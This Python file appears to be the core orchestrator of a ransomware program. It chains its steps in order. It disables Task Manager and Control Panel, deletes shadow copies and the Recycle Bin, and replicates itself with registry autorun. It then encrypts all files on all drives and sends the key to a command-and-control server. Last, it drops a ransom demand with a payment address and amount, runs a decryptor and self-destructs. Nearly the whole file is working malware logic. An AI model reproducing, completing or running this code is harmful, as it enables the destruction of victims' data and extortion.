from stub.ransom.centre import CommandCenter
from stub.file import MassCryptor
from stub.types import ENCRYPTION_CONFIG, stub_config, RansomTransaction
from stub.utils import (
    prevent_interrupt,
    clear_recycle as _one_time_clear_recycle,
    self_destruct,
)
from stub.ransom.other import Pummeler
from stub.types import REGISTRY_KEY
from stub.persistance import Replicator, Registry
from typing import List, Tuple, TypeAlias, Callable, Any, Dict
from stub.ransom.gui import Decryptor
import threading
import base64
import json
import gc
import os

Instruction: TypeAlias = Tuple[
    Callable[..., None] | Callable[..., bool],  # Function
    Tuple[Any, ...],  # Arguments
    Dict[Any, Any],  # Keyword arguments
    str | None,  # Log
    bool | None,  # When to run boolean callback
    Callable[..., None] | None,  # Boolean Callback
    bool,  # Run if True
]
_dn: Tuple[None, None] = (
    None,
    None,
)  # Double None to save space
_tn: Tuple[None, None, None] = (
    None,
    None,
    None,
)  # Triple None
_na: Tuple[Tuple[Any, ...], Dict[Any, Any]] = (
    (),
    {},
)  # Empty Tuple & Dict


class Processor:
    def __init__(self) -> None:
        self.cc = CommandCenter()
        self.ms = MassCryptor(self.cc.AES.key, ENCRYPTION_CONFIG)
        self.reg = Registry()
        self.repl = Replicator()
        self.pum = Pummeler()

        self.ransom_data: Dict[str, Any] | None = None

    def decryptor(self) -> None:
        if self.ransom_data is None:
            return

        dec = Decryptor(RansomTransaction.from_dict(self.ransom_data), self.cc, self.ms)
        dec.mainloop()

    def verify_run(self) -> None:
        check = str(input("Are you sure you want to continue? [y/N] ")).lower()
        if check != "y":
            os._exit(0)

    @staticmethod
    def _log(msg: str | None) -> None:
        if msg:
            return

        if stub_config.DEBUG_LOGS:
            print(msg)

            if not os.path.exists("DEBUG_LOGS.txt"):
                with open("DEBUG_LOGS.txt", "w") as f:
                    f.write(f"{msg}\n")
            else:
                with open("DEBUG_LOGS.txt", "a") as f:
                    f.write(f"{msg}\n")

    def _add_registry(self) -> None:
        if len(self.repl.dest_dirs) > 0:
            if self.reg.exists(REGISTRY_KEY):
                self.reg.remove_from_registry(REGISTRY_KEY)
            self.reg.add_mul_registry(REGISTRY_KEY, self.repl.dest_dirs)

    def _init_ransom(self) -> None:
        self.ransom_data = self.cc.init_ransom()

    def _clear_mem(self) -> None:
        del self.ms.p_key
        del self.cc.AES.key
        del self.cc.AES
        gc.collect()

    def _drop_ransom(self) -> None:
        if not self.ransom_data:
            return

        self.pum.drop_ransom(self.ransom_data["address"], self.ransom_data["amount"])

    def _map_instructions(self) -> List[Instruction]:
        # fmt: off
        # (Function, Arguments, Keyword Arguments, Log, When to run, Boolean Callback, Run if True)
        return [
            # Check if encryptor is already running
            (self.repl.create_attempt_magic_if_not_exists, *_na, "Creating Magic File", False, lambda: self._log("Already running encryptor"), True),
            # Verify run 
            (self.verify_run, *_na, "Verifying run", *_dn, stub_config.VERIFY_RUN),
            # Disable Task Manager
            (self.reg.disable_task_mgr, *_na, "Disabling Task Manager", *_dn, stub_config.disable_task_manager),
            # Disable Control Panel
            (self.reg.disable_ctrl_panel, *_na, "Disabling Control Panel", *_dn, stub_config.disable_control_panel),
            # Prompt fake dialogs
            (threading.Thread(target=self.pum.fake_dialogs, daemon=True).start, *_na, "Prompting fake dialogs", *_dn, stub_config.fake_dialog),
            # Check if already encrypted
            # You could also just check in the database if it exists but that would take a bit of time which we don't have
            (self.pum.magic_exists, *_na, "Checking if already encrypted", True, self.decryptor, True),
            # Clear shadow copies 
            (self.pum.delete_shadow_copies, *_na, "Clearing shadow copies", *_dn, stub_config.delete_shadow_copies),
            # Prevent Ctrl+C
            (threading.Thread(target=prevent_interrupt, daemon=True).start, *_na, "Preventing Ctrl+C", *_dn, stub_config.prevent_interrupt),
            # Clear Recycle Bin (Old Saves could be in there)
            (_one_time_clear_recycle, *_na, "Clearing Recycle Bin", *_dn, stub_config.clear_recycle),
            # Replicate to multiple locations
            (self.repl.replicate, *_na, "Replicating to multiple locations", *_dn, True),
            # Auto Run
            (self._add_registry, *_na, *_tn, stub_config.add_to_registry),
            # Drop files that we have encrypted
            (self.pum.drop_encrypted_files, (self.ms.encrypted, ), {},  "Dropping already encrypted files.", *_dn, True),
            # Encrypt and rename all the files on all drives
            (self.ms.encrypt, *_na, "Encrypting all files", *_dn, True),
            # Send encryption key to C2
            (self._init_ransom, *_na, *_tn, True),
            # We no longer need the Encryption key and want to clear it from memory ASAP
            (self._clear_mem, *_na, *_tn, True),
            # No Longer need the encryptor in registry
            (self.reg.remove_from_registry, (REGISTRY_KEY,), {}, "Removing encryptor from registry", *_dn, stub_config.add_to_registry),
            # Hide the inital desktop files
            (self.pum.hide_desktop_files, *_na, "Hiding Desktop Files", *_dn, stub_config.hide_desktop_files),
            # Drop Magic Sentinel File to indicate files are encrypted already
            (self.pum.drop_magic, (base64.b64encode(json.dumps(self.ransom_data).encode("utf-8")),), {},  "Dropping Magic file", *_dn, True),
            # Generate a bunch of random files
            (self.pum.fill_screen, *_na, "Generating Random Files", *_dn, stub_config.fill_desktop_with_junk),
            # Minimize all windows
            (self.pum.minimize_all_windows, *_na, "Minimizing Windows", *_dn, stub_config.minimize_windows),
            # Close all windows
            (self.pum.close_all_windows, *_na, "Closing Windows", *_dn, stub_config.close_all_windows),
            # Drop Decryptor
            (self.pum.drop_decryptor, *_na, "Dropping Decryptor", *_dn, True),
            # We are no longer encrypting
            (self.repl.delete_attempt_magic, *_na, "Deleting Attempt Magic File", *_dn, True),
            # Run Decryptor
            (self.pum.run_decryptor, *_na, "Running Decryptor", *_dn, True),
            # Self Destruct
            (self_destruct, *_na, "Self Destructing", *_dn, stub_config.self_destruct),
        ]
        # fmt: on

    def _execute_instruction(self, instruction: Instruction) -> None:
        # Easily modifiable instructions to execute atomically
        (
            func,
            args,
            kwargs,
            log,
            when_to_run_callback,
            bool_callback,
            run_if_true,
        ) = instruction

        if run_if_true:
            self._log(log)
            result = func(*args, **kwargs)

            if isinstance(result, bool) and when_to_run_callback:
                if result == when_to_run_callback and bool_callback:
                    bool_callback()

    def run(self) -> None:
        import time

        instructions = self._map_instructions()
        for instruction in instructions:
            time.sleep(2)
            print("Starting next instruction", instruction)
            self._execute_instruction(instruction)


run: Callable[[], None] = Processor().run
